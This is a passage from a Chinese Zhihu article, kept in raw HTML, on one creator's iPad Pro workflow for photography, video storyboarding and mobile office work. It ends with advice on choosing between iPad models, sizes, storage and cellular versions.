还有进步空间，但是它逐渐在变好。对了，没有中文。不过基本上图标都认识，熟悉一下就好。</p>\n<p><b>输出</b></p>\n<p>严肃地说，摄影中的输出都是纸质输出。但是随着社交网络兴起，这一操作逐渐被人忽略。现在基本上，所有的摄影师都是在社交网络上分享照片。</p>\n<p>但是我这里有一个特别的小建议，这就是 iPad 肯定是最好的移动图片阅读器。用 iPad 看照片和用 Mac 看照片不一样。所以如果你的摄影作品需要给别人看，尤其是客户，可以尝试用 iPad 建立一个专门的作品相册，会让你的作品看起来高级不少。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-67cf9e1df7c0f5d74faa0bb5ce6897b7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-67cf9e1df7c0f5d74faa0bb5ce6897b7_r.jpg\"></figure><p>对了，这里还有一点需要特别说明：</p>\n<p>当你在进行对于色彩有要求的任何操作时，切记关闭 iPad 的一些视觉功能，其中包括「夜览」以及「原彩显示」。因为这两个功能都会出于对于眼睛的保护目的，不断的修改屏幕色温，这样我们在调色或者是看图时就不会获得颜色的真实反馈，很可能造成修图的结果和输出结果不一致的情况。</p>\n<p>切记，一定要关掉。</p>\n<p>以上就是我在 iPad 上进行图片摄影的大致流程。但其实对于一般用户来说，iPad 上一些轻量级的修图软件已经可以满足需求。比如，虽然现在搞得一团糟，但是依然有着最好色彩滤镜的 VSCO。比如相对来说，修图功能丰富齐全的泼辣修图，都是很好的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e6d79d12989737d3ab002b006503d142_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-e6d79d12989737d3ab002b006503d142_r.jpg\"></figure><p>但也有一些更加进阶的 iPad 软件，也就是各相机品牌的定制软件。比如松下的软件可以直接实现画面预览和参数控制，把 iPad 变成监视器和控制器，这对一些个人制作者非常友好。我们工作室使用的佳能产品线也可以实现类似的效果，因为 iPad 屏幕更大，监视的意义更加明显。</p>\n<p>但不仅如此，还有更加先进的，这就是哈苏的 Phocus 2。（友情提示，如果你没有哈苏相机，这一部分就可以跳过了。因为 Phocus 2 是哈苏相机专属 app。）</p>\n<p>这款软件有多先进，它竟然可以帮你走完整个摄影流程。</p>\n<p>它可以直接进行拍摄监看，尤其是联机拍摄。联机拍摄对于一些棚拍摄影师来说是一个重要环节，可以让摄影师及时控场调整。而 iPad 联机不需要复杂的布线，摄影师可以更加聚焦于拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-43e6c590c4630eed97253d4b29cb8783_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic4.zhimg.com/v2-43e6c590c4630eed97253d4b29cb8783_r.jpg\"></figure><p>拍摄之后这款软件还可以直接修改图片，而且基本上有着非常完备的读取 Raw 文件，调整 Raw 文件的流程。你可以快速简单的调整，来判断拍摄是否达到预期。</p>\n<p>但这还不是全部，它甚至可以让你在 iPad 上直接给相机和镜头更新固件。不得不说，这里应该夸奖一下哈苏。作为一个老牌相机厂商，却最跟随潮流。你再看看，其它家，具体我就不点名了（傲娇语气），请多花点时间在软件体验上。</p>\n<p>其实在拍摄部分，还有一个很重要的环节我没有说：</p>\n<p>「创意起草」部分。</p>\n<p>无论是摄影还是拍摄视频，「创意起草」都是一个非常重要的环节，越是到摄影的新阶段你会发现更多的是创意。而对于视频来说，从一个想法到几句话再到几个画面，创意起草环节更是影响整个制作以及后续工作效率。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7b7f5b8e7db0ba354e25bfe8825baeda_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-7b7f5b8e7db0ba354e25bfe8825baeda_r.jpg\"></figure><p>而 iPad 是目前为止，我认为最好的「创意起草」工具，它有两样东西。</p>\n<p>一根 Apple Pencil ，以及一个叫做 Paper 的软件。</p>\n<p>这一套组合起来，就是非常重要的创意本。Apple Pencil 自然不用说，是真的好用的。完全可以替代各种形式的笔，这里特别来说说 Paper 这款软件。</p>\n<p>这款软件乍一看在 App Store 中是一个绘画软件，但如果你注意看这款软件的描述就会发现它更多的是一种「速写」软件。这种速写不仅仅是所谓的绘画中的速写，而是一种「想法」速写。所以当我想要开始一个创作时，我会在这个软件上完成最初的想法起草。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f2a7ce72ea8ad6eeecbd91897a3ae5fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic3.zhimg.com/v2-f2a7ce72ea8ad6eeecbd91897a3ae5fe_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>比如我会把我想到的文字、图像都直接在 Paper 上进行快速涂写。和其它的更加专业的绘画软件不同的是，Paper 是以「笔记本」为核心。而绝大多数的绘画软件是「单个图像文件」为核心的。</p>\n<p>这就让 Paper 可以让我们的创作更加随性。</p>\n<p>在没有大范围的使用 iPad 之前，我随身会有一个 Moleskine 的小本子，平时用来记录一些随想，以及写写画画一些内容。</p>\n<p>相信我，当你有了「纸」和「笔」以后，思维会更加流畅和跳跃。所以在有了 iPad 以后，这项工作就完全开始交给 Paper。它非常容易上手，跟着内置的快速教程几分钟就能学会。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2a68cbcb6404542e562112f1f098f469_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-2a68cbcb6404542e562112f1f098f469_r.jpg\"></figure><p>而且这种笔记本的概念，在最近一段时间的更新中还有了一个 「Paper Store」的功能。里面集合了各种各样想象力丰富的笔记本模板，有用来做计划的，用来做思维导图的，甚至是有各种设计或者是手帐。所以，可以说 Paper 就是一个非常酷的收集灵感和美的软件，只要你是创意工作者，就请一定要试试。</p>\n<p>那么我们继续来说视频制作。</p>\n<p>前几天，我去了一次 FIRST 青年电影展，和每年一样和一些青年导演聊了聊。其中我印象很深的是，iPad 在影视工业中参与的部分越来越多，尤其是对一些敢于尝试新设备的团队来说，iPad 从前期的拍摄计划（比如镜头移动规划）到正式拍摄的监看，已经成为了工业制作的一部分。</p>\n<p>但回归到个人制作者，我不得不遗憾地说，目前 iPad 没有一个能够作为核心工作流的视频剪辑软件。这就让 iPad 并不能从开始到后期完成视频制作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f1175ec67d7b07cd2ae1a502297c9e71_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f1175ec67d7b07cd2ae1a502297c9e71_r.jpg\"></figure><p>当然这里的制作是视频生产，如果你是普通的生活记录，那么 iPad 肯定是完全够用的，尤其是 iPad 上有剪映这样的短视频最佳制作工具的。说实话，一开始我对剪映是带着一点「看不上」，但是时代就是这样。对于各类短视频创作者来说，剪映就是最好的选择。而且 M1 芯片版本对于剪映还有特殊加持。</p>\n<p>而像我主要的长视频制作，iPad 就力不从心。现在唯一一个能够拿得出手的剪辑软件是 Luma Fusion。但是实话实说，这款软件不是不能用，就是用起来太笨重，你要是有无限的时间去剪辑能搞定，但是要是规定时间内就不行。</p>\n<p>因此，如果你的主要工作是剪辑长视频，那么 iPad 显然不适合。</p>\n<p>但是这并不意味着 iPad 对视频制作没用，如果你的视频制作中是有脚本一说的，那么因为 Apple Pencil 的加持，iPad 可能就是最好的脚本制作软件。</p>\n<p>我自己目前工作流中，使用的脚本软件是 GoodNotes。</p>\n<p>一方面 GoodNotes 可以允许自定义笔记本模版。所以我就在网上找到了一个非常常见的分镜头脚本绘制模版，然后直接导入 GoodNotes。这样我就可以直接在这个笔记本中绘制需要的画面。因为 GoodNotes 本身就是一个笔记软件，所以绘制功能非常丰富。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_r.jpg\"></figure><p>更为关键的是，笔记软件还可以直接文本输入。所以我可以直接在分镜头旁边输入台词，这样整个视频内容都可以在一个脚本中展现。</p>\n<p>如果你不想额外购买 app，那么 Keynote 也是一个非常好的镜头制作软件，尤其是在视频长度不是很长的情况下。</p>\n<p>Keynote 一样可以兼顾文字输入和 Apple Pencil 绘制。不过它的劣势在于内容是以「页」为单位，相对来说不连贯。当然这也是优势，就是可以直接利用「看片台」摆布不同镜头之间的排布关系。也就是说，使用 Keynote 可能更加注重的是故事架构。</p>\n<p>拍摄脚本对我来说是非常重要的视频拍摄调度工具，不仅让我理清思路，更加重要的是可以方便团队沟通。因此如果你也刚刚开始视频制作，那我最想和你说的经验就是：</p>\n<p>从做脚本开始。</p>\n<p>对了，如果你用的是最新的 2021 款 iPad Pro，那我强烈建议你好好体验一下这款「Liquid 视网膜 XDR 显示屏」。这是目前移动端设备观感最好的屏幕。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a1179ed5beb491b92dc317ac13b9e541_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-a1179ed5beb491b92dc317ac13b9e541_r.jpg\"></figure><p>一方面这可能是最为便宜的 HDR 视频内容制作中心，另一方面观看 HDR 视频本身也是一种极致享受。比如你可以直接尝试一下扎导剪辑版的《正义联盟》HDR 版本，你会发现和以前看的完全不是一个电影。</p>\n<p><b>移动办公</b></p>\n<p>这里需要特别强调的是，iPad Pro 并不是一个全场景办公产品，尤其在你的工作是以「制作 Office 内容」为主的时候。如果你大部分工作场景是坐在办公室里写 Word、制作 PPT 或 Excel ，那么 iPad Pro 完全不适合你。你依然需要使用电脑。</p>\n<p>但是如果你只是需要在工作中偶尔查看一些 Office 文件，或者是需要不断和团队沟通的移动办公，那么 iPad Pro 有着最好的使用体验。尤其是配合蜂窝版 iPad Pro 使用，更是可以让你随时在线。</p>\n<p>我们团队目前一共有四名核心人员，办公软件我们使用的是「飞书」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-16faa293a3f87651a0b80405e7362a51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-16faa293a3f87651a0b80405e7362a51_r.jpg\"></figure><p>一开始我们还是倾向于在微信内完成团队交流的。但是现在我们已经开始逐渐寻找一些办公软件。这是因为对于使用微信办公来说，有两个大痛点：文件管理系统很差，在线沟通系统简陋。</p>\n<p>文件管理系统混乱我相信大家都是深有同感的。文件长时间不下载旧会过期、稍微大一点就不能发送等等都是问题。更为关键的是，完全没有任何在线文档协作，有也是需要第三方来完成。但是在飞书上，这些问题基本上都可以解决。</p>\n<p>尤其是在线文档，它一方面可以极大增加工作效率，完整清晰的修改历史和批注评论功能也可以让整个项目责任分明。当然，文件自然是想什么时候下载就什么时候下载。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9f71f7f865b4221d0b91b9c43deba046_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-9f71f7f865b4221d0b91b9c43deba046_r.jpg\"></figure><p>不过，我更喜欢的是飞书的在线沟通系统。也不仅仅是因为疫情，而是因为工作特性的原因，团队里成员经常出差。所以视频会议也成为了工作的一部分。</p>\n<p>但是视频会议最怕的一件事就是，只能说。</p>\n<p>但是对于我们的视觉创意为主的工作，很多时候单靠语言描述就很抽象，但画出来解释就非常简单。所以每次视频会议的时候，我一定会通过飞书共享桌面给大家，然后用 Apple Pencil 在 Paper 中把自己的想法可以画出来，这样大家都会一目了然。不仅有的效率，还会减少误会。这就是我说为什么即使你不会画画 Apple Pencil 也很重要，归根到底它的「数字铅笔」的特性会带来很多方便。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-454e3fa07f5a67c7f3522ee4f04cedad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic2.zhimg.com/v2-454e3fa07f5a67c7f3522ee4f04cedad_r.jpg\"></figure><p>虽然文章后面有选购指导，但是我觉得这里是一个很好的实例，就把蜂窝版本的问题在这里说：</p>\n<p>如果你是一个经常出差，经常移动办公的人，那么 iPad 蜂窝版绝对不是锦上添花，而是完完全全的雪中送炭。</p>\n<p>基于我长期的经验来看，蜂窝版本有两个可能完全与大家潜意识里的想法相反的事实：</p>\n<p><b>1. 蜂窝版本并不贵</b></p>\n<p>蜂窝版本和同配置的 Wi-Fi 版之间差价是 1200 元，虽然不能说便宜，但是对于能够购买 iPad Pro 的用户来说绝对不是够不到的预算。另一方面很多人担心流量费用贵，这彻彻底底是一个误区。现在不同以往，各种流量卡已经满天飞。以我的腾讯王卡为例，每个月就是两杯咖啡钱，就可以完全覆盖整个的流量费用。</p>\n<p>换句话说「你去星巴克蹭一杯咖啡的钱，就可以满足自己一个月无线上网」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-1c3ab01dbdb4d6c3076a61e1437fd202_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-1c3ab01dbdb4d6c3076a61e1437fd202_r.jpg\"></figure><p><b>2. Wi-Fi 没你想的那么多、那么好用</b></p>\n<p>找 Wi-Fi 很多时候是很一件很痛苦的事，机场或是商圈看似覆盖了 Wi-Fi，但是真要是用起来，要么太慢要么难连。而且只要有一两次不顺利，就很影响工作进度。有磨磨叽叽连 Wi-Fi，追着 Wi-Fi 走的时间不如做点更开心的事。</p>\n<p>这就是为什么我身边凡是用过蜂窝版本都回不去的原因，因为真的太顺畅了。有一次临上飞机发现飞机上没有什么可看的，因为 5G 的原因我就用飞机滑出轨道的时间下载了两部电影。这也是 Wi-Fi 版无法拥有的体验。</p>\n<p><b>结论：</b>如果你真的是一个 iPad 的重度用户，蜂窝版绝对是最好的选择。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5d5c76b5e9b66f210f0391afd5e5c71e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-5d5c76b5e9b66f210f0391afd5e5c71e_r.jpg\"></figure><p>好了，我们回归正题，继续说 iPad 的使用。</p>\n<p>日程管理我们使用的是「日历」以及「滴答清单」</p>\n<p>其实我用过很多日历软件，但是用着用着最后总是觉得没有系统原生的好用。尤其是因为原生的日历可以做到整个苹果生态最好的同步，并且也支持一定的多人同步协作，所以选来选去还是用原生的日历。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8dc1d70075f03d9f549de4d09e4378a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic1.zhimg.com/v2-8dc1d70075f03d9f549de4d09e4378a8_r.jpg\"></figure><p>我对于日历的最大需求就是时间透视功能。我需要大概知道我这个星期需要做什么，还需要我这个月大致需要在哪一个时间段做什么。 所以我使用日历的时候，基本上很少进入日历，而是直接用 iPadOS 15 中最新的小窗口模式，把一个月的工作透视放在桌面上。这样主要我一打开日历就可以看到，整个月份我需要做什么。</p>\n<p>但是自带的日历我一直都有一个不满，这就是 To Do List 比较欠缺。虽然苹果也是自带提醒事项，但是苹果的提醒事项还是过于简陋。对于 To Do List 软件我用过不少，之前用过很长一段时间 Things ，但是渐渐的发现只是相对好看，在时间透视上不够丰富。后来我开始使用滴答清单，滴答清单的好处在于它是一个日历和 To Do List 的结合，不仅可以快速添加各种任务，也可以让我们清楚所有任务的时间线。而且它可以同步订阅系统的自带日历。所以团队内部在日历上的协作，或者是一些出差行程也可以一目了然。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-545a7927d52d7362a66993121eec4501_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic2.zhimg.com/v2-545a7927d52d7362a66993121eec4501_r.jpg\"></figure><p>总的来说，滴答清单都是一个非常不错的时间管理软件。它甚至是还带有番茄钟，对于很多时间管理更加严格的人来说更是一个加分项。</p>\n<p>如果你的工作涉及的电子档签名比较多，前面提过的 PDF Expert 是一个很好的选择，他可以允许你内置各种形式的签名，所以很多文件仅仅是两次点击就可以完成签署。当然我知道很多人处理的文件可能不仅仅是文档，还有各类相对来说奇怪的文件，甚至是压缩包。</p>\n<p>此时我建议你一定要使用 Documents 这款软件备用。你可以直接理解为这是一款「疑难文件解答仪」，它支持各种各样可能你没有听过的格式，解压缩更是有一手，而且还基本免费。因此，下载这个软件，完全有备无患，在官方的文件 App 出现以前我深知是用它来当作文件中心。</p>\n<p>至于邮件软件的话，我觉得自带的就很好用。尤其是随着邮件这几年的大幅度更新，所以自带邮件就挺好。当然，你也可以选择 Gmail。</p>\n<p><b>协作</b></p>\n<p>如果你是一个苹果生态用户，比如你拥有 iPad 的同时还有 Mac，那么你一定要使用一下「随航」。</p>\n<p>其实这一整篇文章中，还有一个 iPad 非常隐性的优势没有提及，这就是整个苹果生态。不过随着苹果产品的普及，这一点大家已经开始善于使用，比如今天大家对于隔空投送已经驾轻就熟了。但是对于一些新的产品联动还不熟悉，所以在这里特别说一下 iPad 和 Mac 的联动，也就是随航。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-591bfd41b0d5a202a02e4fa241d5037c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5084\" data-rawheight=\"3389\" class=\"origin_image zh-lightbox-thumb\" width=\"5084\" data-original=\"https://pic1.zhimg.com/v2-591bfd41b0d5a202a02e4fa241d5037c_r.jpg\"></figure><p>现在我们的 Mac 可以直接作为 Mac 的扩展屏幕。这样在我们使用 Mac 的时候，就可以有更多的屏幕内容，更好的提高使用效率。某种意义上，你的 iPad 可以随时化身为一个小的显示器。</p>\n<p>如果你是重型的办公，多出来的一块屏幕可以让你打开更多的文档，或者可以一块屏幕处理文档，一块屏幕处理消息。</p>\n<p>如果你是视频剪辑工作者，一块屏幕可以素材预览，另一块屏幕可以专注于剪辑线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-88189e95ff132969f2366a4f3ebb9cd2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-88189e95ff132969f2366a4f3ebb9cd2_r.jpg\"></figure><p>而且随航功能非常的先进，它并不是完全占用你的 iPad，而是把 Mac 的屏幕窗口作为 iPad 的一个软件。所以我们可以在随航过程中，随意切出去，直接在使用 Mac 的键鼠操作 iPad。</p>\n<p>这套随航系统，真的在我出差的过程中，给予了我很大的方便。</p>\n<h3>适合自己的才是最好的</h3>\n<p>目前在售的 iPad 产品线，也非常容易梳理。</p>\n<p>iPad Pro（11英寸 &amp; 12.9 英寸）、iPad Air、iPad、iPad mini 共计四个系列产品。</p>\n<p>其中，iPad Pro 以及 iPad Air 系列是目前 iPad 产品线的核心，也就是最为常规的 iPad。而这两个产品线，本质上也就对应着「中端产品线」和「高端产品线」，某种程度上也代表着预算。</p>\n<p>如果预算对你来说不是最为核心的参考，那么直接购买 iPad Pro 肯定是最好的选择。</p>\n<p>你可能会纠结尺寸，那就说我的一些经验：</p>\n<p><b>12.9 英寸 iPad Pro：</b></p>\n<p><b>1. 工作完全以 iPad Pro 为核心的用户。</b>比如大多数情况下你都是在桌子上长时间使用 iPad Pro，并且 iPad Pro 上许多软件都是你工作必备。</p>\n<p>比如我自己就是最常使用 12.9 英寸。就拿写作这件事来说，11 英寸 iPad Pro 的妙控键盘布局还是会非常局促，而 12.9 英寸则刚刚好。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b580cf319a7f8418d1e8febf1875b2d4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-b580cf319a7f8418d1e8febf1875b2d4_r.jpg\"></figure><p><b>2. 工作是视觉为主的。</b>比如你是一个插画师，或者是设计师。那么屏幕尺寸越大越好是永远不变的真理。</p>\n<p><b>3. 想要 HDR 效果。</b>目前只有 2021 款的 12.9 英寸 iPad Pro 配备了 mini LED 屏幕并且可以 HDR 效果。如果你购买 11 英寸 iPad Pro 则依然是 LCD 屏幕。</p>\n<p><b>4. 想要更好的续航。</b>从我的实际使用经验来看，的确 12.9 英寸的续航会比 11 英寸好上一截。</p>\n<p><b>11 英寸 iPad Pro</b></p>\n<p><b>1. 最看重便携。</b>iPad Pro 11 寸在手上非常轻，如果你长时间手持看视频，或者是阅读资料，那么 iPad Pro 11寸会极大的减轻压力。iPad Pro 12.9 手持一会就会觉得疲劳。</p>\n<p><b>2. 没了。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d58b78c515bdb172f2adeeef34f97b36_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-d58b78c515bdb172f2adeeef34f97b36_r.jpg\"></figure><p>所以，除非你说你就是希望可以要一个便携的 iPad Pro，那么选择 12.9 英寸 iPad Pro 是一步到位没有体验牺牲的选择。</p>\n<p>但是需要注意的是，你购买 12.9 英寸 iPad Pro 也不是因为所谓的「便携」，因为它使用上的轻盈感并不是「体积和重量」带来的。</p>\n<p>我自己的 12.9 英寸 iPad Pro 是纯粹的内容生产工具，而 iPad Pro 11 英寸是内容消费工具。</p>\n<p>存储空间上，我自己是 1T 版本，一个重要原因是我需要在出差的时候用 iPad Pro 作为一个存储素材的作用。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2549a0dde02b8ab22baf1f5b5a71d294_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-2549a0dde02b8ab22baf1f5b5a71d294_r.jpg\"></figure><p>即使你并不需要 iPad Pro 作为一个素材的中间存储，我也依然建议你购买 1T 版本。因为在 2021 版 M1 芯片的 iPad Pro中，1TB 以上版本的内存是 16GB ，而 1TB 以下的是 8GB 内存。当然不是说 8GB 不够用，当下是足够用的，就是 16GB 肯定是用得更久一些。</p>\n<p>不过如果你预算不够充足，512GB 也无妨，它基本上可以涵盖大部分场景。而且 512GB 也能够存储一定量的文档。说这句话是因为很多类似律师这类职业的人都在使用 iPad Pro，他们往往会买更大存储空间的版本用来存储文档。</p>\n<p>我不是很建议 256GB 以及 128GB 的存储。因为从我的使用经验来看，最后让 iPad 退役的往往就是存储不够。</p>\n<p>而今天内容体积越来越大，别说 128GB，256GB 都很容易捉襟见肘。不是说不能用，但就是很快就要陷入「删什么」的困境，而且当 iPad 存储空间快要满了的时候也会影响运行速度。</p>\n<p>我其实对性价比这个词越来越谨慎了，因为很多时候性价比是因人而异的，因为对于很多人来说时间更为宝贵，灵感最为宝贵。</p>\n<p>但 iPad Air 的确是一个完全瞄准「学生群体」的性价比产品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5a460472f184e7938665477d08277a39_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"6144\" data-rawheight=\"3456\" class=\"origin_image zh-lightbox-thumb\" width=\"6144\" data-original=\"https://pic2.zhimg.com/v2-5a460472f184e7938665477d08277a39_r.jpg\"></figure><p>总结起来就是，iPad Air 可以让学生在「能够接受的价格下」最大程度上的获得 iPad Pro 的体验。其实尤其是一些刚刚上大学的新生来说，如果购买 iPad Pro 就意味着要做一个「买 Mac 还是买 iPad Pro」的选择题。但是对于 iPad Air 的价格，大多数学生就可以选择都要。</p>\n<p>所以，我自己很建议对于仍然需要考虑预算的学生群体，买 iPad Air 很好。不要去比较那些细微的差别，什么刷新率，什么性能差异等等。记笔记，看课件，够用了。</p>\n<p>既然提到学生，那么就直接说一下教育优惠吧。</p>\n<p>目前苹果有每年一度的返校季活动，购买 iPad Pro、iPad Air、Mac 都会有一定的折扣同时，还能赠送 AirPods 之类的产品，基本上就是学生买到就是赚到。可以在线上教育商店购买，也可以线下的苹果官方零售店购买。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5c835fd4b806a4901bb34721d0f26dd7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"395\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-5c835fd4b806a4901bb34721d0f26dd7_r.jpg\"></figure><p>前提是，必须是在校生，具体的详细规则大家可以咨询 Apple。</p>\n<p>配件方面，我认为如果你买 iPad Pro 或者是 iPad Air，那 Apple Pencil 就是一定要买的。这两款产品也都使用的是二代 Apple Pencil了，体验很好。但如果你的 iPad 就是非常纯粹的内容消费，Apple Pencil 的确不需要。但是只要你的学习工作有纸和笔的参与，那么 Apple Pencil 我认为是必须的。</p>\n<p>至少，我认为现在我买 iPad Pro 的核心驱动力就是这根 Apple Pencil，这是它区别于 Mac 的最重要原因。所以如果 Apple Pencil 对你使用 iPad Pro 来说不是必须，那么你可能需要考虑一下是不是真的需要 iPad Pro 本身，可能 Mac 更适合你。</p>\n<p>然后就是 iPad mini 以及 iPad（不加后缀）。</p>\n<p>这里 iPad mini，我觉得还是有特定人群需要的，总是有人喜欢小屏幕产品。也有很多人对于 iPad mini 情有独钟。目前来看，如果你是一个喜欢用 iPad 玩游戏的人，那么 iPad mini 可能是最好的选择。另一个好的使用场景是随身笔记本，比如经常到处采访的记者。iPad mini 录音一打开，用 Apple Pencil 再随时记录很方便。此时要是用大 iPad 就有点冒犯。</p>\n<p>但是这里需要预警，iPad mini 可能是一个随时更新的产品。</p>\n<p>iPad 入门款，我个人认为最合适的场景就是「看剧神器」，反正我家里是爹妈人手一个。两人各看各的，还不用打架。也就是说，它是一个最为纯粹的，且没有高要求的内容消费产品。小孩子看看网课也不错，但是需要特别注意，入门款的 iPad 没有反射涂层，可能会对小孩子眼睛不够友好。</p>\n<p>对了，iPad Pro 还有一些扩展配件可以一说。其实总结就是，你只需要一个 USB-C 接口的扩展坞即可。最新的 2021 款 iPad Pro 还直接升级成了雷雳 3 接口，让它的扩展性进一步增强。如果你想要连多个设备，可以考虑直接购买。</p>\n<p>我自己目前在用两个配件，一个 USB-C 转 USB-A ，一个读卡器。前者用来应付各种常规配件，比如键盘麦克风，而后者就是用来拷贝素材比较方便。其实今天 USB-C 配件已经很普及了，所以只要有意识的购买就好。</p>\n<h3>写在最后</h3>\n<p>我为什么这么在乎 iPad，或者说是偏爱。</p>\n<p>我不知道你有没有注意到，人的思考是需要辅助工具的。无论你是理性的计算，还是感性的创作，手里有一只笔可以写写画画，有些以前想不通的事情，只要写着写着可能就通了。</p>\n<p>又或者，我们总是会有一些千奇百怪的想法，尤其是对于很多创意工作者，你不知道在什么时间、地点、场合就会随时冒出一些叫做灵感的东西。</p>\n<p>而这个时候，你就会发现，iPad 是最合适承接「一切思考结果」的工具。如果说，今天的 PC 也好，Mac 也好，他们是帮助你完成作品的工具。</p>\n<p>那么，iPad 则保留了这些作品最初的那灵光一闪。</p>\n<p>这就是我喜欢它的原因。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-814914d7d2d8bef3cc0e53115a2910a9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-814914d7d2d8bef3cc0e53115a2910a9_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bigface-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Derrick 